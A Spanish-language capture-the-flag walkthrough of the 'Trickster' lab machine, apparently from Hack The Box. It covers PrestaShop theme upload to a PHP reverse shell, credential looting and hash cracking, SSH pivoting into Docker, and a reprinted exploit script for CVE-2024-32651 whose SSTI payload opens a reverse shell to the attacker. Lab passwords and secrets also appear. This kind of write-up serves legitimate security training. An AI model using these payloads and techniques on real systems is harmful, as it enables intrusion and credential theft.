<br>El html extrae dos tokens necesarios para autenticar las solicitudes en el panel de administración de PrestaShop.
<br>Envía una solicitud POST para importar un tema malicioso desde el servidor HTTP local del atacante.
<br>Si todo funciona correctamente, el tema malicioso se instala en el servidor objetivo, permitiendonos ejecutar código arbitrario.
<br>
<br>
Lee el archivo reverse_shell_template.php, reemplaza los marcadores de posición y guarda el resultado en reverse_shell.php.

<br>la reverse_shell_template.php es la mítica rev-shell de <a data-tooltip-position="top" aria-label="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" rel="noopener nofollow" class="external-link" href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" target="_blank">pentestmonkey</a>


<br>
Copia el archivo ps_next_8_theme_malicious_old.zip, agrega el archivo reverse_shell.php dentro del ZIP y lo guarda como ps_next_8_theme_malicious.zip.

<br><br>
<br>Realiza una solicitud GET a la página /contact-us del sitio objetivo.
<br>Extrae el valor del token CSRF del formulario usando BeautifulSoup.
<br><br>
<br>Prepara una solicitud POST con los siguientes datos:

<br>Un archivo adjunto (exploit.html disfrazado como imagen).
<br>Datos del formulario con el token CSRF, dirección de correo electrónico y mensaje.


<br>Envía la solicitud POST a /contact-us.
<br><br>
<br>Inicia un hilo para enviar solicitudes GET repetidas al archivo PHP malicioso (reverse_shell_new.php) en el servidor objetivo.
<br>Inicia otro hilo para ejecutar el servidor HTTP local.
<br><br>
<br>Si la solicitud POST tiene éxito, inicia un servidor de escucha con ncat en el puerto 12345 para recibir la conexión inversa del shell.
<br>Si se detecta una conexión, detiene todos los hilos.
<br><br>Realiza una limpieza al finalizar:<br>
<br>Elimina el archivo ZIP modificado (ps_next_8_theme_malicious.zip).
<br>Elimina el archivo PHP  (reverse_shell.php).
<br><br><br>Nos creamos una cuenta en el prestashop:<br>
<img alt="Pasted image 20250213112820.png" src="machines/trickster/imgs/pasted-image-20250213112820.png"><br><img alt="Pasted image 20250213120710.png" src="machines/trickster/imgs/pasted-image-20250213120710.png"><br><br>$ cat /etc/passwd | grep -E "/bin/sh|/bin/bash"
root:x:0:0:root:/root:/bin/bash
james:x:1000:1000:trickster:/home/james:/bin/bash
adam:x:1002:1002::/home/adam:/bin/bash
runner:x:1003:1003::/home/runner:/bin/sh
<br>Seguimos en PrivEsc ---&gt; ]]></description><link>machines/trickster/1.recon.html</link><guid isPermaLink="false">Machines/Trickster/1.Recon.md</guid><pubDate>Thu, 13 Feb 2025 11:10:30 GMT</pubDate><enclosure url="machines/trickster/imgs/pasted-image-20250212101724.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;machines/trickster/imgs/pasted-image-20250212101724.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[2.PrivEsc]]></title><description><![CDATA[ 
 <br><br><br>Directorio /var/www<br>www-data@trickster:~$ ls -la
total 20
drwxr-xr-x  5 root     root     4096 Sep 13 12:24 .
drwxr-xr-x 14 root     root     4096 Sep 13 12:24 ..
drwxr-xr-x  2 root     root     4096 Sep 13 12:24 html
drwxr-xr-x 28 www-data www-data 4096 Sep 17 18:07 prestashop
drwxr-xr-x  5 www-data www-data 4096 Feb 13 15:09 trickster
<br><br>www-data@trickster:~$ find / -perm -4000 -print 2&gt;/dev/null
/snap/core20/2379/usr/bin/chfn
/snap/core20/2379/usr/bin/chsh
/snap/core20/2379/usr/bin/gpasswd
/snap/core20/2379/usr/bin/mount
/snap/core20/2379/usr/bin/newgrp
/snap/core20/2379/usr/bin/passwd
/snap/core20/2379/usr/bin/su
/snap/core20/2379/usr/bin/sudo
/snap/core20/2379/usr/bin/umount
/snap/core20/2379/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2379/usr/lib/openssh/ssh-keysign
/snap/core20/2318/usr/bin/chfn
/snap/core20/2318/usr/bin/chsh
/snap/core20/2318/usr/bin/gpasswd
/snap/core20/2318/usr/bin/mount
/snap/core20/2318/usr/bin/newgrp
/snap/core20/2318/usr/bin/passwd
/snap/core20/2318/usr/bin/su
/snap/core20/2318/usr/bin/sudo
/snap/core20/2318/usr/bin/umount
/snap/core20/2318/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2318/usr/lib/openssh/ssh-keysign
/snap/snapd/21759/usr/lib/snapd/snap-confine
/usr/libexec/polkit-agent-helper-1
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/umount
/usr/bin/mount
/usr/bin/passwd
/usr/bin/su
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/opt/google/chrome/chrome-sandbox
<br>GUID<br>www-data@trickster:~$ find / -perm -2000 -print 2&gt;/dev/null
/var/spool/postfix/public
/var/mail
/var/local
/var/log/journal
/var/log/journal/add7a2fa4f114fc2b05f9d28de9f9bb3
/var/log/mysql
/run/log/journal
/snap/core20/2379/usr/bin/chage
/snap/core20/2379/usr/bin/expiry
/snap/core20/2379/usr/bin/ssh-agent
/snap/core20/2379/usr/sbin/pam_extrausers_chkpwd
/snap/core20/2379/usr/sbin/unix_chkpwd
/snap/core20/2379/var/mail
/snap/core20/2318/usr/bin/chage
/snap/core20/2318/usr/bin/expiry
/snap/core20/2318/usr/bin/ssh-agent
/snap/core20/2318/usr/sbin/pam_extrausers_chkpwd
/snap/core20/2318/usr/sbin/unix_chkpwd
/snap/core20/2318/var/mail
/usr/bin/expiry
/usr/bin/dotlockfile
/usr/bin/crontab
/usr/bin/chage
/usr/bin/ssh-agent
/usr/sbin/postqueue
/usr/sbin/unix_chkpwd
/usr/sbin/postdrop
/usr/sbin/pam_extrausers_chkpwd
/usr/lib/x86_64-linux-gnu/utempter/utempter
/usr/local/share/fonts

<br><br>Revisamos las conexiones de la maquina<br>$ netstat -tulnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:41935         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -              
<br>Parece que hay un mysql abierto; era de esperar porque es necesario para el funcionamiento de la pagina web.<br>Vamos a hacer un fuzzeo del directorio de Prestashop para buscar algo relacionado con una base de datos ; seguramente mysql que es la que funciona en el puerto 3306:<br>grep -ri "mysql" /var/www/
grep -risE "(mysql|dbname|db_user|db_password|db_host|database)" /var/www/
<br>Encuentro informacion interesante en la siguiente ruta<br>/var/www/prestashop/var/cache/prod/FrontContainer.php
<br>        return [
            'database_host' =&gt; '127.0.0.1',
            'database_port' =&gt; '',
            'database_name' =&gt; 'prestashop',
            'database_user' =&gt; 'ps_user',
            'database_password' =&gt; 'prest@shop_o',
            'database_prefix' =&gt; 'ps_',
            'database_engine' =&gt; 'InnoDB',
            'mailer_transport' =&gt; 'smtp',
            'mailer_host' =&gt; '127.0.0.1',
            'mailer_user' =&gt; NULL,
            'mailer_password' =&gt; NULL,
            'secret' =&gt; 'eHPDO7bBZPjXWbv3oSLIpkn5XxPvcvzt7ibaHTgWhTBM3e7S9kbeB1TPemtIgzog',
            'ps_caching' =&gt; 'CacheMemcache',
            'ps_cache_enable' =&gt; false,
            'ps_creation_date' =&gt; '2024-05-25',
            'locale' =&gt; 'en-US',
            'use_debug_toolbar' =&gt; true,
            'cookie_key' =&gt; '8PR6s1SJZLPCjXTegH7fXttSAXbG2h6wfCD3cLk5GpvkGAZ4K9hMXpxBxrf7s42i',
            'cookie_iv' =&gt; 'fQoIWUoOLU0hiM2VmI1KPY61DtUsUx8g',
<br><br>Bueno como dirian mis colegas del sector "we're in"<br>
<img alt="Pasted image 20250213163524.png" src="machines/trickster/imgs/pasted-image-20250213163524.png"><br>MariaDB [(none)]&gt; show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| prestashop         |
+--------------------+
<br>De la base de datos saco las siguientes credenciales;<br>admin@trickster.htb : $2y$10$P8wO3jruKKpvKRgWP6o7o.rojbDoABG9StPUt0dR7LIeK26RdlB/C
james@trickster.htb : $2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6yG5LyunCmm
<br>Identificamos los hashes:<br>➜  Trickster hashcat credentials 
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-haswell-AMD Custom APU 0405, 6360/12785 MB (2048 MB allocatable), 8MCU

The following 4 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce


<br>Creds :<br>
Crackeamos las passwords con hashcat o john <br>john credentials --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -m 3200  credentials /usr/share/wordlists/rockyou.txt 
<br>james : alwaysandforever
<br><br>Nos logeamos por ssh<br>➜  Trickster ssh james@trickster.htb
The authenticity of host 'trickster.htb (10.10.11.34)' can't be established.
ED25519 key fingerprint is SHA256:SZyh4Oq8EYrDd5T2R0ThbtNWVAlQWg+Gp7XwsR6zq7o.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'trickster.htb' (ED25519) to the list of known hosts.
james@trickster.htb's password: 
Last login: Thu Sep 26 11:13:01 2024 from 10.10.14.41
james@trickster:~$ id
uid=1000(james) gid=1000(james) groups=1000(james)
james@trickster:~$ whoami
james
james@trickster:~$ 
<br>Sudo -l :<br>james@trickster:~$ sudo -l
[sudo] password for james: 
Sorry, user james may not run sudo on trickster.
<br>Revisando la configuracion de la red vemos que tenemos acceso a una red de docker pero no podemos ejecutar comandos de docker ya que james no forma parte del grupo docker:<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:94:e4:77 brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    altname ens160
    inet 10.10.11.34/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
3: docker0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:18:3b:cb:65 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
37: vethf843401@if36: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether 0e:e5:f9:ea:9f:36 brd ff:ff:ff:ff:ff:ff link-netnsid 0
<br>viendo que tenemos una interfaz de ip's de docker vamos a escanear la red en búsqueda de posibles puntos de ataque;<br>Ya que nmap no esta  instalado en la maquina vamos a escanear la maquina con tecnicas lotl (living off the land)<br><a data-tooltip-position="top" aria-label="https://sevenlayers.com/index.php/blog/490-living-off-the-land-scanning" rel="noopener nofollow" class="external-link" href="https://sevenlayers.com/index.php/blog/490-living-off-the-land-scanning" target="_blank">Living  off the land tecniches : nmap</a><br><br>james@trickster:~$ for i in {1..254}; do ping -w 2 -c 1 172.17.0.$i | grep "64 bytes" | cut -d ' ' -f 4 | sed 's/://'; done;

172.17.0.1
172.17.0.2
<br>Vemos que tiene conexion con 2 ips dentro del rango;<br>
la 172.17.0.1 es la del propio host; mientras que la 172.17.0.2 parece de un container; vamos a investigar puertos abiertos<br><br>Escaneamos con nc el rango entero de puertos de la ip 172.17.0.2<br>james@trickster:~$ nc -vnz -w 1 172.17.0.2 1-65535 2&gt;&amp;1 | grep succeeded
Connection to 172.17.0.2 5000 port [tcp/*] succeeded!
<br>Tenemos conexion con el puerto 5000 vamos a hacer pivoting con ssh<br><br>Tenemos algun servicio corriendo en un docker en la ip 172.17.0.2 por el puerto 5000 vamos a hacer un puente con ssh para tener conexion con el puerto aunque podriamos hacer pivoting con chisel ,metaexploit o lingolo-ng;<br>➜  ~ ssh james@trickster.htb -L 5000:172.17.0.2:5000
<br>Podemos escanear el puerto con nmap a ver si encontramos informacion del servicio; ahora que esta establecido el puente la conexion<br>sudo nmap -sCV -p 5000 -v -Pn -n localhost
PORT     STATE SERVICE VERSION                                       
5000/tcp open  http    Python http.server 3.5 - 3.10
| http-title: Change Detection
|_Requested resource was /login?next=/
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
<br>Nos encontramos ante un changedetection.io en la v0.45.20<br>
<img alt="Pasted image 20250214113934.png" src="machines/trickster/imgs/pasted-image-20250214113934.png"><br><br>Investigando sobre la version de changedetection.io ; vemos que la version es vulnerable a la un SSTI en la version actual <br>Un SSTI (Server-Side Template Injection) es una vulnerabilidad de seguridad que permite a un atacante inyectar y ejecutar código en la plantilla de una aplicación del lado del servidor, aprovechando malas prácticas en el procesamiento de datos dinámicos. Esto puede llevar a la ejecución remota de código, acceso no autorizado o robo de datos sensibles. Ocurre cuando la aplicación inserta entradas de usuario sin sanitizar en templates que son procesados por el servidor.<br>Para mas informacion sobre ataques SSTI podemos visitar la pagina de <a data-tooltip-position="top" aria-label="https://portswigger.net/web-security/server-side-template-injection" rel="noopener nofollow" class="external-link" href="https://portswigger.net/web-security/server-side-template-injection" target="_blank">Portswigger</a><br>Esta vulnerabilidad de changedetection.io esta documentada en el <a data-tooltip-position="top" aria-label="https://nvd.nist.gov/vuln/detail/CVE-2024-32651" rel="noopener nofollow" class="external-link" href="https://nvd.nist.gov/vuln/detail/CVE-2024-32651" target="_blank">CVE-2024-32651</a><br><br>Buscamos en github y hay un PoC que automatiza el proceso del SSTI ; pongo el codigo y lo analizamos;<br>Al siguiente script debemos pasarle las siguientes variables<br>
<br>--url: URL base del sitio vulnerable (Nuestro caso: http://localhost:5000).
<br>--port: Puerto en el que el atacante escuchará la conexión inversa 
<br>--ip: Dirección IP del atacante para recibir la conexión inversa. (Nuestra interfaz tun0)
<br>--notification: URL de notificación personalizada (opcional).
<br># Exploit Title: changedetection &lt;= 0.45.20 Remote Code Execution (RCE)
# Date: 5-26-2024
# Exploit Author: Zach Crosman (zcrosman)
# Vendor Homepage: changedetection.io
# Software Link: https://github.com/dgtlmoon/changedetection.io
# Version: &lt;= 0.45.20
# Tested on: Linux
# CVE : CVE-2024-32651

from pwn import *
import requests
from bs4 import BeautifulSoup
import argparse

def start_listener(port):
    listener = listen(port)
    print(f"Listening on port {port}...")
    conn = listener.wait_for_connection()
    print("Connection received!")
    context.newline = b'\r\n'
    # Switch to interactive mode
    conn.interactive()

def add_detection(url, listen_ip, listen_port, notification_url=''):
    session = requests.Session()
    
    # First request to get CSRF token
    request1_headers = {
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "close"
    }

    response = session.get(url, headers=request1_headers)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrf_token'})['value']
    print(f'Obtained CSRF token: {csrf_token}')

    # Second request to submit the form and get the redirect URL
    add_url = f"{url}/form/add/quickwatch"
    add_url_headers = {  # Define add_url_headers here
        "Origin": url,
        "Content-Type": "application/x-www-form-urlencoded"
    }
    add_url_data = {
        "csrf_token": csrf_token,
        "url": "https://reddit.com/r/baseball",
        "tags": '',
        "edit_and_watch_submit_button": "Edit &gt; Watch",
        "processor": "text_json_diff"
    }

    post_response = session.post(add_url, headers=add_url_headers, data=add_url_data, allow_redirects=False)

    # Extract the URL from the Location header
    if 'Location' in post_response.headers:
        redirect_url = post_response.headers['Location']
        print(f'Redirect URL: {redirect_url}')
    else:
        print('No redirect URL found')
        return

    # Third request to add the changedetection url with ssti in notification config
    save_detection_url = f"{url}{redirect_url}"
    save_detection_headers = {  # Define save_detection_headers here
        "Referer": redirect_url,
        "Cookie": f"session={session.cookies.get('session')}"
    }

    save_detection_data = {
        "csrf_token": csrf_token,
        "url": "https://reddit.com/r/all",
        "title": '',
        "tags": '',
        "time_between_check-weeks": '',
        "time_between_check-days": '',
        "time_between_check-hours": '',
        "time_between_check-minutes": '',
        "time_between_check-seconds": '30',
        "filter_failure_notification_send": 'y',
        "fetch_backend": 'system',
        "webdriver_delay": '',
        "webdriver_js_execute_code": '',
        "method": 'GET',
        "headers": '',
        "body": '',
        "notification_urls": notification_url,
        "notification_title": '',
        "notification_body": f"""
        {{% for x in ().__class__.__base__.__subclasses__() %}}
        {{% if "warning" in x.__name__ %}}
        {{{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\\"{listen_ip}\\",{listen_port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\\"/bin/bash\\")'").read()}}}}
        {{% endif %}}
        {{% endfor %}}
        """,
        "notification_format": 'System default',
        "include_filters": '',
        "subtractive_selectors": '',
        "filter_text_added": 'y',
        "filter_text_replaced": 'y',
        "filter_text_removed": 'y',
        "trigger_text": '',
        "ignore_text": '',
        "text_should_not_be_present": '',
        "extract_text": '',
        "save_button": 'Save'
    }
    final_response = session.post(save_detection_url, headers=save_detection_headers, data=save_detection_data)

    print('Final request made.')

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Add detection and start listener')
    parser.add_argument('--url', type=str, required=True, help='Base URL of the target site')
    parser.add_argument('--port', type=int, help='Port for the listener', default=4444)
    parser.add_argument('--ip', type=str, required=True, help='IP address for the listener')
    parser.add_argument('--notification', type=str, help='Notification url if you don\'t want to use the system default')
    args = parser.parse_args()


    add_detection(args.url, args.ip, args.port, args.notification)
    start_listener(args.port)
<br>
<br>Configuración del Listener:

<br>Inicia un listener en un puerto especificado para recibir una conexión inversa desde el servidor vulnerable.


<br>Obtención del Token CSRF:

<br>Realiza una solicitud GET al sitio objetivo para obtener un token CSRF necesario para realizar solicitudes autenticadas.


<br>Creación de una Nueva Detección:

<br>Envía una solicitud POST para agregar una nueva URL a monitorear en la aplicación.
<br>Utiliza este proceso para obtener una URL de redirección que permite editar la configuración de la detección.


<br>Inyección de Código Malicioso:

<br>En la configuración de notificaciones de la nueva detección, inserta un payload SSTI que:

<br>Itera sobre las clases base del sistema Python.
<br>Busca una clase con "warning" en su nombre.
<br>Utiliza esta clase para importar y ejecutar comandos del sistema operativo.
<br>Ejecuta un comando que establece una conexión inversa al IP y puerto del atacante usando python3 y bash.




<br>Envío del Payload:

<br>Guarda la configuración maliciosa enviando otra solicitud POST.
<br>Esto activa el payload SSTI en el servidor vulnerable.


<br>Recepción de la Conexión Inversa:

<br>El servidor vulnerable ejecuta el código inyectado, conectándose al listener del atacante.
<br>El atacante obtiene acceso interactivo a la shell del servidor.


<br>El script no funciona, pruebo a reproducirlo paso a paso anadiendo debugs<br>Y es que el endpoint /login?next=/ Nos devuelve un 500 INTERNAL SERVER ERROR<br>
<img alt="Pasted image 20250214124302.png" src="machines/trickster/imgs/pasted-image-20250214124302.png"><br>Pruebo a logearme con las credenciales de james alwaysandforever<br>
Y entramos;<br>
<img alt="Pasted image 20250214125118.png" src="machines/trickster/imgs/pasted-image-20250214125118.png"><br>Si pulsamos en backup nos decarga un comprimido; vamos a echarle un vistazo;<br>➜  backdump ls
b86f1003-3ecb-4125-b090-27e15ca605b9  changedetection-backup-20250214115130.zip  url-list-with-tags.txt  url-watches.json
bbdd78f6-db98-45eb-9e7b-681a0c60ea34  secret.txt                                 url-list.txt
➜  backdump tree b86f1003-3ecb-4125-b090-27e15ca605b9 
b86f1003-3ecb-4125-b090-27e15ca605b9
|-- 3855b43e05c02a09c0b63be14f70a8bb.txt.br
|-- 7fa5d9292139604c79d87fb69f21ffe2.txt.br
|-- ce6278706b3912f01bf5355004eb538a.txt.br
|-- cf0c62552e4672c2326c0ef0489883c8.txt.br
|-- d589415eb5dbd392fa8874829ce30450.txt.br
|-- dd25d6c8b666e21ac6e596faa4d4a93d.txt.br
`-- history.txt

1 directory, 7 files
➜  backdump cat b86f1003-3ecb-4125-b090-27e15ca605b9/history.txt 
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: b86f1003-3ecb-4125-b090-27e15ca605b9/history.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 1725049268,dd25d6c8b666e21ac6e596faa4d4a93d.txt.br
   2   │ 1725093859,7fa5d9292139604c79d87fb69f21ffe2.txt.br
   3   │ 1725955071,d589415eb5dbd392fa8874829ce30450.txt.br
   4   │ 1726233055,cf0c62552e4672c2326c0ef0489883c8.txt.br
   5   │ 1726596196,ce6278706b3912f01bf5355004eb538a.txt.br
   6   │ 1726746285,3855b43e05c02a09c0b63be14f70a8bb.txt.br
───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
➜  backdump cat url-list.txt 
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: url-list.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ https://news.ycombinator.com/
   2   │ https://changedetection.io/CHANGELOG.txt
───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
➜  backdump cat secret.txt 
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: secret.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 5fce75c64d33acf05d2d3b21d29e693d992f240d5c440310cff3edfb743c64a5

<br><br>En el exploit de Python anterior, vimos la existencia de una flag llamada “–notification”, identificamos en el pie del campo “Notification Body” que usa Jinja2, esto nos permite ejecutar ataques de tipo SSTI (Server-Side Template Injection), reutilizamos el payload del exploit, nos ponemos en escucha por el puerto 80 y pulsamos en “Send test notification”:<br>Recibimos conexion con el servidor mandando una peticion por notification<br>
<img alt="Pasted image 20250214130533.png" src="machines/trickster/imgs/pasted-image-20250214130533.png"><br>
Ahora tenemos que inyectar la rev shell del script en el campo notifications; y somos root en el container<br><img alt="Pasted image 20250214130827.png" src="machines/trickster/imgs/pasted-image-20250214130827.png"><br>Encuentro el directorio /datastore/Backups dentro del container; no tenemos ni nc ni wget pero si python entonces puedo lanzat un servidor http y hacer otro puente ssh hacia el puerto<br>root@a4b9a36ae7ff:/datastore/Backups# python -m http.server 2000
Serving HTTP on 0.0.0.0 port 2000 (http://0.0.0.0:20
<br><img alt="Pasted image 20250214131310.png" src="machines/trickster/imgs/pasted-image-20250214131310.png"><br>Dentro de los backups encontramos estos archivos .br;<br><img alt="Pasted image 20250214174849.png" src="machines/trickster/imgs/pasted-image-20250214174849.png"><br>Lo descomprimimos con la herramienta <a data-tooltip-position="top" aria-label="https://github.com/google/brotli" rel="noopener nofollow" class="external-link" href="https://github.com/google/brotli" target="_blank">brotli</a> ; <br>➜  b4a8b52d-651b-44bc-bbc6-f9e8c6590103 l
total 16K
drwxrwxr-x 2 kali kali 4,0K ago 31 10:50 .
drwxrwxr-x 3 kali kali 4,0K feb 14 13:14 ..
-rw-r--r-- 1 kali kali 2,6K ago 31 01:47 f04f0732f120c0cc84a993ad99decb2c.txt.br
-rw-r--r-- 1 kali kali   51 ago 31 01:47 history.txt
➜  b4a8b52d-651b-44bc-bbc6-f9e8c6590103 brotli -d f04f0732f120c0cc84a993ad99decb2c.txt.br
➜  b4a8b52d-651b-44bc-bbc6-f9e8c6590103 ls
f04f0732f120c0cc84a993ad99decb2c.txt  f04f0732f120c0cc84a993ad99decb2c.txt.br  history.txt

<br>en el archivo de texto encontraamos la password del usuario Adam<br>
<img alt="Pasted image 20250214175709.png" src="machines/trickster/imgs/pasted-image-20250214175709.png"><br><br>➜  b4a8b52d-651b-44bc-bbc6-f9e8c6590103 cat --plain f04f0732f120c0cc84a993ad99decb2c.txt | grep password
                'database_password' =&gt; 'adam_admin992' ,                                                                                                               
                'mailer_password' =&gt; NULL ,                                                                                                                            
➜  b4a8b52d-651b-44bc-bbc6-f9e8c6590103 ssh adam@trickster.htb
adam@trickster.htb's password: 
adam@trickster:~$ id
uid=1002(adam) gid=1002(adam) groups=1002(adam)
adam@trickster:~$ whoami
adam
adam@trickster:~$ 
<br>Adam puede usar sudo en :<br>adam@trickster:~$ sudo -l
Matching Defaults entries for adam on trickster:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User adam may run the following commands on trickster:
    (ALL) NOPASSWD: /opt/PrusaSlicer/prusaslicer
<br>El binario no aparece en GTFObins; una busqueda en google me indica que igual es un binario relacionado con la gestion de impresoras;<br>
<img alt="Pasted image 20250214181500.png" src="machines/trickster/imgs/pasted-image-20250214181500.png"><br>Le realizamos un string <br>adam@trickster:~$ strings /opt/PrusaSlicer/prusaslicer | grep print
sprintf
fprintf
appimage_print_binary
appimage_print_hex
print_help
  --appimage-mount                Mount embedded filesystem image and print

<br>adam@trickster:~$ /opt/PrusaSlicer/prusaslicer
DISPLAY not set, GUI mode not available.

PrusaSlicer-2.6.1+linux-x64-GTK2-202309060801 based on Slic3r (with GUI support)
https://github.com/prusa3d/PrusaSlicer

Usage: prusa-slicer [ ACTIONS ] [ TRANSFORM ] [ OPTIONS ] [ file.stl ... ]

Actions:
 --export-3mf        Export the model(s) as 3MF.
 --export-amf        Export the model(s) as AMF.
 --export-gcode, --gcode, -g
                     Slice the model and export toolpaths as G-code.
 --export-obj        Export the model(s) as OBJ.
 --export-sla, --sla Slice the model and export SLA printing layers as PNG.
 --export-stl        Export the model(s) as STL.
 --gcodeviewer       Visualize an already sliced and saved G-code
 --help, -h          Show this help.
 --help-fff          Show the full list of print/G-code configuration options.
 --help-sla          Show the full list of SLA print configuration options.
 --info              Write information about the model to the console.
 --opengl-debug      Activate OpenGL debug output on graphic cards which support it
 --opengl-version ABCD
                     Select a specific version of OpenGL
 --save ABCD         Save configuration to the specified file.
 --slice, -s         Slice the model as FFF or SLA based on the printer_technology configuration
                     value.

Transform options:
 --align-xy X,Y      Align the model to the given point.
 --center X,Y        Center the print around the given center.
 --cut N             Cut model at the given Z.
 --delete-after-load ABCD
                     Delete files after loading.
 --dont-arrange      Do not rearrange the given models before merging and keep their original XY
                     coordinates.
 --duplicate N       Multiply copies by this factor.
 --duplicate-grid X,Y
                     Multiply copies by creating a grid.
 --ensure-on-bed     Lift the object above the bed when it is partially below. Enabled by default,
                     use --no-ensure-on-bed to disable.
 --merge, -m         Arrange the supplied models in a plate and merge them in a single model in order
                     to perform actions once.
 --repair            Try to repair any non-manifold meshes (this option is implicitly added whenever
                     we need to slice the model to perform the requested action).
 --rotate N          Rotation angle around the Z axis in degrees.
 --rotate-x N        Rotation angle around the X axis in degrees.
 --rotate-y N        Rotation angle around the Y axis in degrees.
 --scale N           Scaling factor or percentage.
 --scale-to-fit X,Y,Z
                     Scale to fit the given volume.
 --split             Detect unconnected parts in the given model(s) and split them into separate
                     objects.

Other options:
 --config-compatibility
                     This version of PrusaSlicer may not understand configurations produced by the
                     newest PrusaSlicer versions. For example, newer PrusaSlicer may extend the list
                     of supported firmware flavors. One may decide to bail out or to substitute an
                     unknown value with a default silently or verbosely. (disable, enable,
                     enable_silent; default: enable)
 --datadir ABCD      Load and store settings at the given directory. This is useful for maintaining
                     different profiles or including configurations from a network storage.
 --ignore-nonexistent-config
                     Do not fail if a file supplied to --load does not exist.
 --load ABCD         Load configuration from the specified file. It can be used more than once to
                     load options from multiple files.
 --loglevel N        Sets logging sensitivity. 0:fatal, 1:error, 2:warning, 3:info, 4:debug, 5:trace
                     For example. loglevel=2 logs fatal, error and warning level messages.
 --output ABCD, -o ABCD
                     The file where the output will be written (if not specified, it will be based on
                     the input file).
 --single-instance   If enabled, the command line arguments are sent to an existing instance of GUI
                     PrusaSlicer, or an existing PrusaSlicer window is activated. Overrides the
                     "single_instance" configuration value from application preferences.

Print options are processed in the following order:
  1) Config keys from the command line, for example --fill-pattern=stars
     (highest priority, overwrites everything below)
  2) Config files loaded with --load
  3) Config values loaded from amf or 3mf files

Run --help-fff / --help-sla to see the full listing of print options.

